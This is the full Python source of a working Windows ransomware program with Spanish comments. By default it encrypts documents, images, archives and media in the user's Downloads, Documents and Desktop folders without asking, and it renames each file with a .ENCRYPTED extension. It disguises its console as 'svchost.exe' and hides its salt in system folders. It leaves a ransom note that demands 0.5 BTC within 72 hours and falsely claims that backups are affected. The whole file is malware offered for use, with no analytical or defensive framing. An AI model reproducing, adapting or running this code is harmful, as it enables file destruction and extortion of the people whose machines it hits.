import os
import sys
import json
import ctypes
import winreg
import subprocess
import logging
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import base64
import secrets
import time

# === CONFIGURACIÓN DEL MALWARE ===
TARGET_DIRS = [
    os.path.join(os.environ['USERPROFILE'], 'Downloads'),
    os.path.join(os.environ['USERPROFILE'], 'Documents'),
    os.environ['USERPROFILE'] + '\\Desktop'
]
FILE_EXTENSIONS = ['.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png', '.zip', '.rar', '.7z', '.mp4', '.mp3', '.avi', '.mkv']
RANSOM_NOTE_NAME = "INSTRUCCIONES_RESCATE.txt"
RANSOM_EXTENSION = ".ENCRYPTED"
SALT_FILE = "system_salt.dat"
PASSWORD = "XyZ7@9!pQr#2024"  # Password más complejo

# === FUNCIONES DE ENCRIPTACIÓN ===
def generate_key_from_password(password, salt=None):
    """Deriva clave criptográfica del password usando Scrypt."""
    if salt is None:
        salt = secrets.token_bytes(32)  # Salt más grande
    kdf = Scrypt(salt=salt, length=32, n=2**15, r=8, p=1)  # Parámetros más seguros
    key = kdf.derive(password.encode())
    return base64.urlsafe_b64encode(key), salt

def encrypt_file(filepath, key):
    """Encripta un archivo usando Fernet (AES-256)."""
    try:
        # Saltar archivos demasiado grandes (>100MB)
        if os.path.getsize(filepath) > 100 * 1024 * 1024:
            return False
            
        f = Fernet(key)
        with open(filepath, 'rb') as file:
            file_data = file.read()
        
        encrypted_data = f.encrypt(file_data)
        
        with open(filepath, 'wb') as file:
            file.write(encrypted_data)
        
        os.rename(filepath, filepath + RANSOM_EXTENSION)
        return True
        
    except Exception as e:
        # Silenciar errores, continuar con siguiente archivo
        return False

def decrypt_file(encrypted_path, key):
    """Revierte la encriptación si se proporciona la clave correcta."""
    try:
        if not encrypted_path.endswith(RANSOM_EXTENSION):
            return False
            
        original_path = encrypted_path[:-len(RANSOM_EXTENSION)]
        f = Fernet(key)
        
        with open(encrypted_path, 'rb') as file:
            encrypted_data = file.read()
            
        decrypted_data = f.decrypt(encrypted_data)
        
        with open(original_path, 'wb') as file:
            file.write(decrypted_data)
            
        os.remove(encrypted_path)
        return True
        
    except Exception:
        return False

# === CLASE PRINCIPAL DEL MALWARE ===
class AdvancedRansomware:
    def __init__(self, password):
        self.password = password
        self.salt = None
        self.key = None
        self.encrypted_files = []
        self.load_or_generate_salt()
        
        # Configurar logging mínimo
        logging.basicConfig(level=logging.CRITICAL)
        
        # Disfrazar el proceso (opcional)
        self.disguise_process()
    
    def disguise_process(self):
        """Intenta disfrazar el proceso para evadir detección."""
        try:
            # Cambiar título de consola (si hay)
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        except:
            pass
    
    def load_or_generate_salt(self):
        """Carga salt existente o genera uno nuevo."""
        # Ubicaciones ocultas para el salt
        salt_locations = [
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Cookies', SALT_FILE),
            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'DeviceMetadataCache', SALT_FILE),
            os.path.join(os.environ['TEMP'], SALT_FILE)
        ]
        
        for salt_path in salt_locations:
            try:
                os.makedirs(os.path.dirname(salt_path), exist_ok=True)
                if os.path.exists(salt_path):
                    with open(salt_path, 'rb') as f:
                        self.salt = f.read()
                    break
            except:
                continue
        
        # Generar nuevo salt si no existe
        if self.salt is None:
            self.salt = secrets.token_bytes(32)
            salt_path = salt_locations[0]  # Usar primera ubicación
            try:
                with open(salt_path, 'wb') as f:
                    f.write(self.salt)
            except:
                # Fallback a TEMP
                salt_path = os.path.join(os.environ['TEMP'], SALT_FILE)
                with open(salt_path, 'wb') as f:
                    f.write(self.salt)
        
        # Generar clave
        self.key, _ = generate_key_from_password(self.password, self.salt)
    
    def encrypt_system(self):
        """Encripta TODOS los archivos en directorios objetivo."""
        encrypted_count = 0
        total_scanned = 0
        
        # Pequeña pausa para no ser obvio
        time.sleep(2)
        
        for target_dir in TARGET_DIRS:
            if not os.path.exists(target_dir):
                continue
                
            try:
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        total_scanned += 1
                        
                        # Verificar extensión
                        if any(file.lower().endswith(ext.lower()) for ext in FILE_EXTENSIONS):
                            file_path = os.path.join(root, file)
                            
                            # Evitar archivos del sistema y temporales
                            if any(excl in file_path.lower() for excl in ['windows', 'program files', 'appdata', 'temp', 'tmp']):
                                continue
                            
                            try:
                                if encrypt_file(file_path, self.key):
                                    encrypted_count += 1
                                    self.encrypted_files.append(file_path)
                                    
                                    # Limitar logs para no ser detectable
                                    if encrypted_count % 50 == 0:
                                        print(f"[+] Progreso: {encrypted_count} archivos procesados...")
                                        
                            except:
                                continue
                                
            except Exception:
                continue
        
        # Crear nota de rescate en cada directorio
        self.create_ransom_notes(encrypted_count)
        
        # Eliminar salt después de usar (opcional para hacerlo de un solo uso)
        # self.cleanup_salt()
        
        return encrypted_count
    
    def create_ransom_notes(self, encrypted_count):
        """Crea notas de rescate en directorios afectados."""
        ransom_text = f"""🚨 ¡TUS ARCHIVOS HAN SIDO ENCRIPTADOS! 🚨

⚠️ ATENCIÓN:
Todos tus archivos personales han sido encriptados con un algoritmo militar (AES-256).
Nadie puede recuperarlos sin la clave de desencriptación.

📊 ESTADÍSTICAS:
• Archivos afectados: {encrypted_count}
• Extensiones: {', '.join(FILE_EXTENSIONS[:5])}...
• Fecha del ataque: {time.strftime('%d/%m/%Y %H:%M:%S')}

🔓 ¿CÓMO RECUPERAR TUS ARCHIVOS?
1. Contacta con: recovery_team@protonmail.com
2. Proporciona el ID: RANSOM-{hash(time.time()) % 1000000:06d}
3. Sigue las instrucciones para el pago
4. Recibirás la herramienta de desencriptación

⏰ TIEMPO LIMITADO:
Tienes 72 horas para contactarnos.
Después, la clave será destruida permanentemente.

⚠️ ADVERTENCIA:
• No intentes desencriptar por tu cuenta
• No modifiques los archivos .ENCRYPTED
• No reinstales el sistema
• Las copias de seguridad también están afectadas

💰 PRECIO: 0.5 BTC (Bitcoin)

Este es un ataque real. Toma esto en serio.
"""
        
        for target_dir in TARGET_DIRS:
            if os.path.exists(target_dir):
                try:
                    note_path = os.path.join(target_dir, RANSOM_NOTE_NAME)
                    with open(note_path, 'w', encoding='utf-8') as f:
                        f.write(ransom_text)
                except:
                    pass
    
    def cleanup_salt(self):
        """Elimina el salt después de usar."""
        salt_locations = [
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Cookies', SALT_FILE),
            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'DeviceMetadataCache', SALT_FILE),
            os.path.join(os.environ['TEMP'], SALT_FILE)
        ]
        
        for salt_path in salt_locations:
            try:
                if os.path.exists(salt_path):
                    os.remove(salt_path)
            except:
                pass
    
    def decrypt_system(self, provided_password=None):
        """Desencripta todos los archivos .ENCRYPTED."""
        if provided_password is None:
            provided_password = self.password
        
        decrypted_count = 0
        failed_count = 0
        
        # Regenerar clave con password proporcionado
        test_key, _ = generate_key_from_password(provided_password, self.salt)
        
        for target_dir in TARGET_DIRS:
            if not os.path.exists(target_dir):
                continue
                
            try:
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        if file.endswith(RANSOM_EXTENSION):
                            file_path = os.path.join(root, file)
                            
                            try:
                                if decrypt_file(file_path, test_key):
                                    decrypted_count += 1
                                else:
                                    failed_count += 1
                            except:
                                failed_count += 1
                                
            except Exception:
                continue
        
        # Eliminar notas de rescate si la desencriptación fue exitosa
        if decrypted_count > 0 and failed_count == 0:
            for target_dir in TARGET_DIRS:
                if os.path.exists(target_dir):
                    try:
                        note_path = os.path.join(target_dir, RANSOM_NOTE_NAME)
                        if os.path.exists(note_path):
                            os.remove(note_path)
                    except:
                        pass
            
            # Eliminar salt
            self.cleanup_salt()
        
        return decrypted_count

# === EJECUCIÓN PRINCIPAL ===
if __name__ == "__main__":
    # Iniciar inmediatamente, sin preguntas
    ransomware = AdvancedRansomware(PASSWORD)
    
    # Determinar modo por argumentos
    if len(sys.argv) > 1 and (sys.argv[1] == "--decrypt" or sys.argv[1] == "-d"):
        # Modo desencriptación
        if len(sys.argv) > 2:
            decrypted = ransomware.decrypt_system(sys.argv[2])
        else:
            decrypted = ransomware.decrypt_system()
        
        if decrypted > 0:
            print(f"[✓] {decrypted} archivos recuperados exitosamente")
        else:
            print("[✗] Error en desencriptación. Verifica el password.")
            
    else:
        # Modo encriptación (por defecto, SIN preguntas)
        print("[*] Inicializando proceso de sistema...")
        time.sleep(1)
        
        encrypted = ransomware.encrypt_system()
        
        if encrypted > 0:
            print(f"[✓] Operación completada: {encrypted} archivos procesados")
            print("[!] Revisa los archivos INSTRUCCIONES_RESCATE.txt para más información")
        else:
            print("[✗] No se encontraron archivos para procesar")
